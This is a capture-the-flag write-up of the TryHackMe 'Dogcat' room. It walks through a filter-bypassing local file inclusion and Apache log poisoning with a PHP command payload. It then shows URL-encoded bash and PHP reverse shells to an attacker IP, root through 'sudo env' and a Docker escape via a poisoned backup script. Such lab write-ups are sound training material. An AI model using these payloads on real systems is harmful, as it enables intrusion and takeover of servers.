# Dog Cat

> **TryHackMe Room**: [Dogcat](https://tryhackme.com/room/dogcat)

This write-up covers how I approached the room, step by step. Flags are not included.

## Initial Access

The Nmap scan showed ports `22` and `80` open. On port `80` was a simple site with two buttons, "dog" and "cat": pressing one showed a picture of that animal. The interesting part was the URL:

```url
http://<Machine IP>/?view=dog
```

A `view` parameter loading a file is a classic sign of LFI, so I started testing.

### Local File Inclusion

First, a normal traversal payload, and then a direct attempt to read the index:

```url
http://<Machine IP>/?view=../../../../etc/passwd
http://<Machine IP>/?view=index.php
```

Both returned: 

```text
Sorry, only dogs or cats are allowed. 
```

So the input was being filtered. To understand how, I read the source with the `php://filter` wrapper, which base64-encodes a file so it comes back as text instead of being executed:

```url
http://<Machine IP>/?view=php://filter/convert.base64-encode/resource=dog
```

Decoding that gave only the dog image snippet:

```php
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

So I read the main page instead, using a traversal that still contained "dog" to satisfy the filter:

```url
http://<Machine IP>/?view=php://filter/convert.base64-encode/resource=dog/../index
```

Decoding the result revealed the page logic:

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
        if(isset($_GET['view'])) {
            if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                echo 'Here you go!';
                include $_GET['view'] . $ext;
            } else {
                echo 'Sorry, only dogs or cats are allowed.';
            }
    }
?>
```

Two things stand out. The `view` value must contain the string "dog" or "cat", and the code appends an extension to it, defaulting to `.php` unless an `ext` parameter is supplied. The filter checks the string, but the filesystem resolves the real path, so a value like `dog/../` contains “dog” (passing the check) while `dog/..` cancels out on disk. And the forced `.php` can be removed by passing an empty `ext`. Together:

```url
http://<Machine IP>/?view=dog/../../../../../etc/passwd&ext=
```

Fewer `../` also work, for example: `dog/../../../../etc/passwd&ext=`.

### Log poisoning

To turn file reading into code execution, I used log poisoning. In Burp Suite, I set the User-Agent of a request to a small PHP payload, which gets written into the Apache access log:

```php
<?php system($_GET['cmd']);?>
```

Then I included the log file directly through the LFI (a plain include, not through `php://filter`, since the point now is to execute the planted code) and appended a command to run, for example `&cmd=id`. That returned the output of `id`, confirming command execution.

## Getting the reverse shell and Privilege Escalation

For an interactive session I used revshells.com. The bash reverse shell did not work:

```url
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<MYIP>%2F4444%200%3E%261
```

I tried several, and the PHP one worked:

```url
php%20-r%20%27%24sock%3Dfsockopen%28%22<MYIP>%22%2C4444%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

With a shell as `www-data`, I collected the flags: one beside `dog.php` and `cat.php`, one under `/var/www/`, and a third pointing toward `/root`. To reach root, I ran `sudo -l` and found I could run `env` with sudo without a password. `env` can execute an arbitrary command, so per GTFOBins, running it through sudo runs that command as root:

```bash
sudo env /bin/bash
```

That gave a root shell, and the third flag.

## Docker Container Escape and Getting the Final Flag

There was a fourth flag I could not find even as root. The room description had told me the goal was to "break out of a docker container", and I now realized the root I had was root inside a container, not on the host.

Looking for a way out, I found a `backup.sh` script in `/opt`. I appended a reverse shell to it, started a `netcat` listener, and waited. A short while later a shell connected back as root on the host, where the fourth flag was.

## Conclusion

Dogcat is rated medium, but almost all of the difficulty is in the initial access; once you have a shell, the rest is straightforward. This is the room that made me decide to write up Local File Inclusion as a concept, and to go back and redo the other LFI rooms I had done. It was the hardest of the LFI rooms for me at first, and after redoing them all and learning the technique properly, it finally makes sense.

The `ext` parameter was a new idea for me: both how a forced extension constrains the include, and how an empty `ext` removes it. It is not a universal trick, though. I tried reaching the log as `.../apache2/access&ext=log` to supply the extension that way, and it did not work, so overriding the extension does not solve every case.

One more lesson: when a reverse shell fails, try a different kind. The bash reverse shell did not work here, but a PHP one did, because what matters is which interpreter the target actually runs.
